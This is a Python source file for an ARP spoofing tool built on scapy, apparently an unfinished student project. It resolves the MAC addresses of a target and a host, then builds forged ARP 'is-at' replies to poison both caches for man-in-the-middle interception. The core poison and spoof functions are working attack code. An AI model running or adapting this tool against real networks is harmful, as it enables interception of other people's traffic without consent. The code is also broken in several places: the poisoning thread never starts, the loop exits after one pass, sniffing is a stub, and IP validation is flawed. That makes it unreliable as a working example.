# /usr/bin/python3 
'''
ARPSpoof Program by Clayton Johnson and Mitchell Bohn

Steps:
	Take IPs and find their MAC Addresses through ARP Request

'''
import argparse
from scapy.all import Ether, ARP, sr, send
from time import sleep
import threading
import sys

def get_mac_address(ip):
	#Make ARP Request to get MAC addy for given ip
	#print(f'Making ARP Request for {ip}')
	'''print('Making ARP Request for {}'.format(ip))
	
	#arp_pkt = Ether('ff:ff:ff:ff:ff:ff')/ARP(pdst=ip)
	response, extra = srp(Ether('ff:ff:ff:ff:ff:ff')/ARP(pdst=ip, op='is-at'), timeout=5, verbose=0)
	mac = None
	if response:
		#print(response[0][1].src)
		mac = response[0][1].src
	#print(f'{ip} => {mac}')
	print('{} => {}'.format(ip, mac))
	'''
	resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip), retry=2, timeout=10)
	for s,r in resp:
		print(resp[0][1][ARP].hwsrc)
		return resp[0][1][ARP].hwsrc


def clean_ip(addr):
	#Makes sure that the ip address is valid
	#print(f'Cleaning {addr}')
	ret_addr = ''
	addr_list = addr.split('.')
	if len(addr_list) < 4:
		ret_addr = None
	else:
		#print(f'list: {addr_list}')
		for byte in addr_list:
			#print(f'byte: {byte} => {int(byte)}')
			if (int(byte) >= 0) and (int(byte) <= 255):
				ret_addr += byte + '.'
	return ret_addr[:-1]

def clean_mac(mac):
	#Makes sure that the mac address is valid

	return mac

def poison(mac_1=None, ip_1=None, mac_2=None, ip_2=None):
	print('Poisoning...')
	if mac_1 and ip_1 and mac_2 and ip_2:
		#Build arp packet
		pkt12 = ARP(pdst=ip_1, hwdst=mac_1, psrc=ip_2, op='is-at')
		pkt21 = ARP(pdst=ip_2, hwdst=mac_2, psrc=ip_1, op='is-at')
		
		while True:
			#Send arp packet to 
			send(pkt12)	
			send(pkt21)
		
			#Wait a couple seconds
			sleep(3)

			return 'we need to stop for testing purposes and add some error conditions'
			

def start_sniffing_stuff(t_ip, t_mac, h_ip, h_mac):
	print('Sniffing initiated...')

def spoof_time(t_ip, h_ip):
	#print(f'Target IP: {t_ip}')
	print('Target IP: {}'.format(t_ip))
	#print(f'Host IP: {h_ip}')
	print('Host IP: {}'.format(h_ip))
	
	#Get MAC Addys for both target and host ips
	t_mac = get_mac_address(t_ip)
	h_mac = get_mac_address(h_ip)

	#Poison cache -> Saw an idea that split the cache poisoning to a separate thread to keep it constant
	# I like this idea...
	
	#Kick off thread to poison the cache
	poison_thread = threading.Thread(target=poison, args=(clean_mac(t_mac), t_ip, clean_mac(h_mac), h_ip), name='def_not_arp_spoof')
	#poison_thread.run()

	#Receive traffic and output
	start_sniffing_stuff(t_ip, t_mac, h_ip, h_mac)

	sleep(3)

if __name__ == '__main__':
	#Usage : $ arpspoof.py -t <targetIP> -r <host>
	parser = argparse.ArgumentParser()
	parser.add_argument('-t', help='target ip address')
	parser.add_argument('-r', help='host ip address')
	args = parser.parse_args()
	if args.t and args.r:
		#print(f'Target IP: {args.t}')
		#print(f'Host IP: {args.r}')
		spoof_time(clean_ip(args.t), clean_ip(args.r))
	else:
		parser.print_help(sys.stderr)
		sys.exit(1)	
